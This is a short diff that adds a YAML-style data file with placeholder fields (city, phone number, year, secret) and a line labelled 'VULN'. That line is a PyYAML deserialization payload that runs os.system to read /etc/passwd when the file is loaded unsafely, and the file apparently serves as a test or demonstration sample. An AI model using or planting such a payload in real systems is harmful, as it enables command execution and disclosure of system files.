@@ -1,0 +1,6 @@
+City: biysk
+Tel: 89076543432
+Year: 1778
+Secret: FDCVDGTRYHNJUYTGFDRFGTYHJUIKMNB=
+VULN: !!python/object/apply:os.system ["cat /etc/passwd"]
+
